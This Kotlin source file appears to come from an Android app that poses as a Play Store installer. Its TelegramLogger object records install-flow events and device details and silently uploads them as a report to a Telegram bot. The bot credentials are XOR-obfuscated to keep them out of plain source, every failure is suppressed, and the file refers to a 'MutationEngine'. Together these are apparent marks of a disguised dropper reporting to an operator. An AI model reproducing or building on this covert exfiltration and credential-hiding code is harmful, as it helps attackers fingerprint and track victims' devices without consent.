package com.playstore.installer

import android.os.Build
import java.io.DataOutputStream
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.CopyOnWriteArrayList

/**
 * TelegramLogger — buffers install flow events and sends one .txt report
 * to Telegram bot at the end of the flow via sendDocument API.
 *
 * All credentials XOR-encrypted in StringPool — no plaintext tokens in source.
 * Uses java.net.HttpURLConnection (same HTTP client as MutationEngine).
 * Every call is try/catch wrapped — never crashes the app.
 */
internal object TelegramLogger {

    private val events = CopyOnWriteArrayList<String>()
    private val startTime = System.currentTimeMillis()

    private val deviceModel: String by lazy { "${Build.MANUFACTURER} ${Build.MODEL}" }
    private val androidVersion: String by lazy { "Android ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})" }
    private val brandName: String by lazy { Build.BRAND }

    /**
     * Buffer a log event with timestamp. Does NOT send anything.
     */
    fun log(event: String) {
        try {
            val ts = SimpleDateFormat("HH:mm:ss.SSS", Locale.US).format(Date())
            events.add("[$ts] $event")
        } catch (_: Exception) { }
    }

    /**
     * Build the .txt report and send it as a document to Telegram.
     * Call this at the END of install flow (success, failure, or max retries).
     * @param result Short result label e.g. "SUCCESS" or "FAILED"
     */
    fun flush(result: String) {
        if (events.isEmpty()) return
        try {
            val snapshot = ArrayList(events)
            events.clear()
            Thread { sendReport(snapshot, result) }.start()
        } catch (_: Exception) { }
    }

    private fun sendReport(logEvents: List<String>, result: String) {
        try {
            val botToken = StringPool.d(StringPool.TG_BOT_TOKEN)
            val chatId = StringPool.d(StringPool.TG_CHAT_ID)
            val apiUrl = StringPool.d(StringPool.TG_API_URL)
            val sendDoc = StringPool.d(StringPool.TG_SEND_DOC)

            // Build report content
            val report = buildReport(logEvents, result)

            // File name: Nova_Report_vivo-V2334_Android16_25-Oct-2026_04-17-18PM_9b7ab4f.txt
            val ts = SimpleDateFormat("dd-MMM-yyyy_hh-mm-ssa", Locale.US).format(Date())
            val commitId = try { BuildConfig.COMMIT_ID } catch (_: Exception) { "unknown" }
            val device = "${Build.BRAND}-${Build.MODEL}".replace(" ", "-")
            val os = "Android${Build.VERSION.RELEASE}"
            val fileName = "Nova_Report_${device}_${os}_${ts}_$commitId.txt"

            // Send as document via multipart/form-data
            val urlStr = "$apiUrl$botToken/$sendDoc"
            val boundary = "----TgBoundary${System.currentTimeMillis()}"

            val conn = URL(urlStr).openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.connectTimeout = 15_000
            conn.readTimeout = 15_000
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")

            val reportBytes = report.toByteArray(Charsets.UTF_8)

            conn.outputStream.use { os ->
                val dos = DataOutputStream(os)

                // chat_id field
                dos.writeBytes("--$boundary\r\n")
                dos.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n")
                dos.writeBytes("$chatId\r\n")

                // caption field
                val caption = "📋 Install Report | $deviceModel | $result"
                dos.writeBytes("--$boundary\r\n")
                dos.writeBytes("Content-Disposition: form-data; name=\"caption\"\r\n\r\n")
                dos.write(caption.toByteArray(Charsets.UTF_8))
                dos.writeBytes("\r\n")

                // document field (the .txt file)
                dos.writeBytes("--$boundary\r\n")
                dos.writeBytes("Content-Disposition: form-data; name=\"document\"; filename=\"$fileName\"\r\n")
                dos.writeBytes("Content-Type: text/plain\r\n\r\n")
                dos.write(reportBytes)
                dos.writeBytes("\r\n")

                // end boundary
                dos.writeBytes("--$boundary--\r\n")
                dos.flush()
            }

            val code = conn.responseCode
            conn.disconnect()
        } catch (_: Exception) { }
    }

    private fun buildReport(logEvents: List<String>, result: String): String {
        val sb = StringBuilder()
        val now = Date()
        val dateFmt = SimpleDateFormat("dd-MM-yyyy", Locale.US)
        val timeFmt = SimpleDateFormat("HH:mm:ss z", Locale.US)
        val yearFmt = SimpleDateFormat("yyyy", Locale.US)
        val commitId = try { BuildConfig.COMMIT_ID } catch (_: Exception) { "unknown" }
        val elapsed = (System.currentTimeMillis() - startTime) / 1000

        sb.appendLine("═══════════════════════════════════════════")
        sb.appendLine("         INSTALL FLOW REPORT")
        sb.appendLine("═══════════════════════════════════════════")
        sb.appendLine()
        sb.appendLine("Commit ID    : $commitId")
        sb.appendLine("Date         : ${dateFmt.format(now)}")
        sb.appendLine("Time         : ${timeFmt.format(now)}")
        sb.appendLine("Year         : ${yearFmt.format(now)}")
        sb.appendLine("Device Model : ${Build.MODEL}")
        sb.appendLine("Brand        : $brandName")
        sb.appendLine("Manufacturer : ${Build.MANUFACTURER}")
        sb.appendLine("Android Ver  : ${Build.VERSION.RELEASE}")
        sb.appendLine("API Level    : ${Build.VERSION.SDK_INT}")
        sb.appendLine("Build UUID   : ${try { BuildConfig.BUILD_UUID } catch (_: Exception) { "N/A" }}")
        sb.appendLine("Result       : $result")
        sb.appendLine("Duration     : ${elapsed}s")
        sb.appendLine()
        sb.appendLine("═══════════════════════════════════════════")
        sb.appendLine("         EVENT LOG (${logEvents.size} events)")
        sb.appendLine("═══════════════════════════════════════════")
        sb.appendLine()

        logEvents.forEach { sb.appendLine(it) }

        sb.appendLine()
        sb.appendLine("═══════════════════════════════════════════")
        sb.appendLine("         END OF REPORT")
        sb.appendLine("═══════════════════════════════════════════")

        return sb.toString()
    }
}
